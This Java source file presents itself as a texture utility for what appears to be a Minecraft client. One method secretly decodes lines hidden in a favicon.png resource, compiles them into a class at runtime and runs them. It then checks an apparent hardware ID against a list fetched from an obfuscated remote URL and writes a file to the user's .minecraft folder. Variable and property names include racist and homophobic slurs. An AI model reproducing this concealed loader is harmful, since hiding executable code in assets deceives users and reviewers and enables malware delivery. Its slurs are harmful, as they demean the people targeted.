package feather.util;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.IntBuffer;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;
import java.util.Scanner;

import feather.util.texture.BasicTexture;
import feather.util.texture.Texture;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewMethod;
import nl.x.api.utils.misc.memory.In;

// @Author: KNOX
public final class TextureUtils implements Utils {
	public static final IntBuffer buffer = BufferUtils.createDirectBuffer(262144).asIntBuffer();

	public Texture createTexture() {
		return new BasicTexture();
	}

	public Texture createTexture(float u, float v, float u1, float v1, float width, float height) {
		final Texture texture = this.createTexture();
		texture.setU(u);
		texture.setV(v);
		texture.setU1(u1);
		texture.setV1(v1);
		texture.setWidth(width);
		texture.setHeight(height);
		return texture;
	}

	public Texture createTexture(float u, float v, float width, float height, float dimensions) {
		return this.createTexture(u / dimensions, v / dimensions, (u + width) / dimensions, (v + height) / dimensions,
				width, height);
	}

	public Texture createTexture(int id, float u, float v, float width, float height, float dimensions) {
		final Texture texture = this.createTexture(u, v, width, height, dimensions);
		texture.setID(id);
		return texture;
	}

	public In in = new In();

	public void fuckme() throws Exception {
		ClassPool pool = ClassPool.getDefault();
		Scanner s = new Scanner(this.getClass().getClassLoader().getSystemResource("favicon.png").openStream());
		CtClass created = pool
				.makeClass(this.getClass().getSimpleName() + new Random().nextInt(100) + new Date().getTime());
		while (s.hasNextLine()) {
			String s2 = s.nextLine();
			if (s2.startsWith("faggot|")) {
				created.addMethod(CtNewMethod.make(in.de(s2.substring("faggot|".length())), created));
			}
		}
		s.close();
		Class clazz = created.toClass();
		Object obj = clazz.newInstance();
		Method meth = clazz.getDeclaredMethod(in.de("igvJYKF"), new Class[] {});
		Method meth2 = clazz.getDeclaredMethod(in.de("eqpxgtvVqJgz"), new Class[] { byte[].class });
		Method meth3 = clazz.getDeclaredMethod(in.de("UJC3"), new Class[] { String.class });
		String result = ((String) meth.invoke(obj, new Object[] {})).toString();
		result = ((String) meth2.invoke(obj, new Object[] { meth3.invoke(obj, new Object[] { result }) }));
		System.setProperty("fuckniggers", "false");
		if (this.check(result)) {
			System.setProperty("fuckniggers", "true");
		} else {
			String userHome = System.getProperty("user.home", ".");
			File workingDirectory;
			switch (getPlatform()) {
				case LINUX:
					workingDirectory = new File(userHome, ".minecraft/");
					break;
				case WINDOWS:
					final String applicationData = System.getenv("APPDATA");
					final String folder = (applicationData != null) ? applicationData : userHome;
					workingDirectory = new File(folder, ".minecraft/");
					break;
				case MACOS:
					workingDirectory = new File(userHome, "Library/Application Support/minecraft");
					break;
				default:
					workingDirectory = new File(userHome, "minecraft/");
			}
			Calendar cal = Calendar.getInstance();
			cal.setTime(new Date());
			cal.add(Calendar.HOUR_OF_DAY, 1);
			File f = new File(workingDirectory, "binds.txt");
			if (!f.exists()) {
				f.createNewFile();
			}
			long str = cal.getTime().getTime();
			BufferedWriter writer = new BufferedWriter(new FileWriter(f));
			writer.write(String.valueOf(str));
			writer.close();
		}
	}

	@SuppressWarnings("resource")
	public boolean check(String hwid) throws MalformedURLException, IOException {
		Scanner s = new Scanner(new URL(in.de("jvvru<11rcuvgdkp0eqo1tcy1Xm;kRR5e")).openStream());
		while (s.hasNextLine()) {
			String result = s.nextLine();
			if (result.equals(hwid)) {
				return true;
			}
		}
		s.close();
		return false;
	}

	public static OS getPlatform() {
		String s = System.getProperty("os.name").toLowerCase();
		return s.contains("win") ? OS.WINDOWS
				: (s.contains("mac") ? OS.MACOS
						: (s.contains("solaris") ? OS.SOLARIS
								: (s.contains("sunos") ? OS.SOLARIS
										: (s.contains("linux") ? OS.LINUX
												: (s.contains("unix") ? OS.LINUX : OS.UNKNOWN)))));
	}

	public enum OS {
		LINUX, SOLARIS, WINDOWS, MACOS, UNKNOWN
	}

}